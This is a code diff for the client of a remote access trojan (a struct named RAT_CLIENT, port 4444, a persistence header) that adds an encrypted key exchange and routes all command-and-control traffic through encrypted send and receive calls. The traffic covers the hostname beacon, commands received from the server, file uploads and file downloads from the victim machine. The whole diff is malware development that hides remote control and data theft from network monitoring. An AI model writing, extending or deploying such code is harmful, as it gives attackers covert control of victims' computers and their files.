@@ -34,6 +34,7 @@
 #endif
 
 #include "../include/persistence.h"
+#include "../include/crypto.h"
 
 #define PORT 4444
 #define BUFFER_SIZE 4096
@@ -52,6 +53,7 @@ typedef struct {
     char os_type[32];
     char username[256];
     char hostname[256];
+    crypto_context_t crypto_ctx;
 } RAT_CLIENT;
 
 // Function to detect the operating system
@@ -116,6 +118,105 @@ void generate_prompt(RAT_CLIENT *client, char *prompt, size_t prompt_size) {
     }
 }
 
+int perform_client_key_exchange(RAT_CLIENT *client) {
+    unsigned char *our_public_key = NULL;
+    int our_key_len = 0;
+    unsigned char *peer_public_key = NULL;
+    int peer_key_len = 0;
+    unsigned char *encrypted_aes_key = NULL;
+    int encrypted_key_len = 0;
+    int result = -1;
+    
+    // Export our public key
+    if (crypto_export_public_key(&client->crypto_ctx, &our_public_key, &our_key_len) != 0) {
+        printf("Error: Failed to export public key\n");
+        goto cleanup;
+    }
+    
+    // Receive server's public key length
+    uint32_t peer_key_len_net;
+    if (recv(client->client_fd, &peer_key_len_net, sizeof(peer_key_len_net), 0) != sizeof(peer_key_len_net)) {
+        printf("Error: Failed to receive server public key length\n");
+        goto cleanup;
+    }
+    peer_key_len = ntohl(peer_key_len_net);
+    
+    if (peer_key_len <= 0 || peer_key_len > 4096) {
+        printf("Error: Invalid server public key length\n");
+        goto cleanup;
+    }
+    
+    // Receive server's public key
+    peer_public_key = malloc(peer_key_len);
+    if (!peer_public_key) {
+        printf("Error: Memory allocation failed\n");
+        goto cleanup;
+    }
+    
+    if (recv(client->client_fd, peer_public_key, peer_key_len, 0) != peer_key_len) {
+        printf("Error: Failed to receive server public key\n");
+        goto cleanup;
+    }
+    
+    // Import server's public key
+    if (crypto_import_public_key(&client->crypto_ctx, peer_public_key, peer_key_len) != 0) {
+        printf("Error: Failed to import server public key\n");
+        goto cleanup;
+    }
+    
+    // Send our public key length and key
+    uint32_t key_len_net = htonl(our_key_len);
+    if (send(client->client_fd, &key_len_net, sizeof(key_len_net), 0) != sizeof(key_len_net)) {
+        printf("Error: Failed to send public key length\n");
+        goto cleanup;
+    }
+    
+    if (send(client->client_fd, our_public_key, our_key_len, 0) != our_key_len) {
+        printf("Error: Failed to send public key\n");
+        goto cleanup;
+    }
+    
+    // Receive encrypted AES key length
+    uint32_t enc_key_len_net;
+    if (recv(client->client_fd, &enc_key_len_net, sizeof(enc_key_len_net), 0) != sizeof(enc_key_len_net)) {
+        printf("Error: Failed to receive encrypted key length\n");
+        goto cleanup;
+    }
+    encrypted_key_len = ntohl(enc_key_len_net);
+    
+    if (encrypted_key_len <= 0 || encrypted_key_len > 1024) {
+        printf("Error: Invalid encrypted key length\n");
+        goto cleanup;
+    }
+    
+    // Receive encrypted AES key
+    encrypted_aes_key = malloc(encrypted_key_len);
+    if (!encrypted_aes_key) {
+        printf("Error: Memory allocation failed\n");
+        goto cleanup;
+    }
+    
+    if (recv(client->client_fd, encrypted_aes_key, encrypted_key_len, 0) != encrypted_key_len) {
+        printf("Error: Failed to receive encrypted AES key\n");
+        goto cleanup;
+    }
+    
+    // Decrypt AES key
+    if (crypto_decrypt_aes_key(&client->crypto_ctx, encrypted_aes_key, encrypted_key_len) != 0) {
+        printf("Error: Failed to decrypt AES key\n");
+        goto cleanup;
+    }
+    
+    result = 0;
+    
+cleanup:
+    if (our_public_key) free(our_public_key);
+    if (peer_public_key) free(peer_public_key);
+    if (encrypted_aes_key) free(encrypted_aes_key);
+    
+    return result;
+}
+
 int connect_to_server(RAT_CLIENT *client) {
 #ifdef _WIN32
     WSADATA wsaData;
@@ -160,6 +261,19 @@ int connect_to_server(RAT_CLIENT *client) {
         return -1;
     }
     
+    // Initialize crypto context for client
+    if (crypto_init(&client->crypto_ctx, 0) != 0) {
+        printf("Error: Failed to initialize encryption\n");
+        return -1;
+    }
+    
+    // Perform key exchange
+    if (perform_client_key_exchange(client) != 0) {
+        printf("Error: Key exchange failed\n");
+        crypto_cleanup(&client->crypto_ctx);
+        return -1;
+    }
+    
     // Initialize OS and user information
     detect_os(client);
     get_username(client);
@@ -176,8 +290,8 @@ int connect_to_server(RAT_CLIENT *client) {
     }
 #endif
     
-    // Send hostname to server for compatibility
-    send(client->client_fd, client->hostname, strlen(client->hostname), 0);
+    // Send hostname to server for compatibility (now encrypted)
+    crypto_send(client->client_fd, &client->crypto_ctx, client->hostname, strlen(client->hostname), 0);
     
     // Get current directory
     if (getcwd(client->current_dir, sizeof(client->current_dir)) == NULL) {
@@ -200,7 +314,7 @@ void send_response(RAT_CLIENT *client, const char *response) {
         return;
     }
     
-    int bytes_sent = send(client->client_fd, response, strlen(response), 0);
+    int bytes_sent = crypto_send(client->client_fd, &client->crypto_ctx, response, strlen(response), 0);
     if (bytes_sent <= 0) {
         // Connection likely broken, mark as invalid
         client->client_fd = INVALID_SOCKET;
@@ -250,7 +364,7 @@ void send_response_with_prompt(RAT_CLIENT *client, const char *response) {
     
     while (sent < total_len && client->client_fd != INVALID_SOCKET) {
         int to_send = (total_len - sent > chunk_size) ? chunk_size : (total_len - sent);
-        int bytes_sent = send(client->client_fd, full_response + sent, to_send, 0);
+        int bytes_sent = crypto_send(client->client_fd, &client->crypto_ctx, full_response + sent, to_send, 0);
         
         if (bytes_sent <= 0) {
             client->client_fd = INVALID_SOCKET;
@@ -431,7 +545,7 @@ void handle_download(RAT_CLIENT *client, const char *filename) {
     
     // Send file content
     while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
-        int bytes_sent = send(client->client_fd, buffer, bytes_read, 0);
+        int bytes_sent = crypto_send(client->client_fd, &client->crypto_ctx, buffer, bytes_read, 0);
         if (bytes_sent <= 0) {
             client->client_fd = INVALID_SOCKET;
             fclose(file);
@@ -481,7 +595,7 @@ void handle_upload(RAT_CLIENT *client) {
     
     // Read upload info character by character until newline
     while (info_pos < (int)(sizeof(upload_info) - 1)) {
-        bytes_received = recv(client->client_fd, &temp_char, 1, 0);
+        bytes_received = crypto_recv(client->client_fd, &client->crypto_ctx, &temp_char, 1, 0);
         if (bytes_received <= 0) {
             if (bytes_received == 0) {
                 send_response_with_prompt(client, "Error: Connection closed during upload info reception");
@@ -500,7 +614,7 @@ void handle_upload(RAT_CLIENT *client) {
     upload_info[info_pos] = '\0';
     
     // Send acknowledgment to server
-    int ack_sent = send(client->client_fd, "OK", 2, 0);
+    int ack_sent = crypto_send(client->client_fd, &client->crypto_ctx, "OK", 2, 0);
     if (ack_sent <= 0) {
         client->client_fd = INVALID_SOCKET;
         return;
@@ -590,7 +704,7 @@ void handle_upload(RAT_CLIENT *client) {
     }
     
     // Receive file content
-    while ((bytes_received = recv(client->client_fd, buffer, BUFFER_SIZE, 0)) > 0) {
+    while ((bytes_received = crypto_recv(client->client_fd, &client->crypto_ctx, buffer, BUFFER_SIZE, 0)) > 0) {
         size_t bytes_written = fwrite(buffer, 1, bytes_received, file);
         if (bytes_written != (size_t)bytes_received) {
             fclose(file);
@@ -654,7 +768,7 @@ void execute_commands(RAT_CLIENT *client) {
     while (client->client_fd != INVALID_SOCKET) {
         // Receive command from server
         memset(command, 0, sizeof(command));
-        bytes_received = recv(client->client_fd, command, sizeof(command) - 1, 0);
+        bytes_received = crypto_recv(client->client_fd, &client->crypto_ctx, command, sizeof(command) - 1, 0);
         
         if (bytes_received <= 0) {
             if (bytes_received == 0) {
@@ -739,6 +853,7 @@ void cleanup(RAT_CLIENT *client) {
     if (client->client_fd > 0) {
         close(client->client_fd);
     }
+    crypto_cleanup(&client->crypto_ctx);
 #ifdef _WIN32
     WSACleanup();
 #endif
